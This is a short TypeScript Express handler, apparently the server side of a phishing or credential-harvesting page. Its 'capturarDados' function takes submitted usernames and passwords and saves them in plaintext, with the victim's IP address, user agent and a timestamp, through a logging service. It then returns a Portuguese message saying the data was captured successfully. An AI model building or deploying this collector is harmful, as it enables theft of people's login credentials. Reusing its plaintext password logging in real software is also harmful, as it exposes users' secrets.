import { Request, Response } from 'express';
import { salvarLog } from '../services/services';
import { getClientIp } from '../utils/logger';

export function capturarDados(req: Request, res: Response): void {
  const { username, password } = req.body;
  const ip = getClientIp(req);
  const userAgent = req.headers['user-agent'];

  const registro = {
    username,
    password,
    ip,
    userAgent,
    timestamp: new Date().toISOString()
  };

  salvarLog(registro);
  
  res.status(200).json({ status: 'ok', message: 'Dados capturados com sucesso' });
}
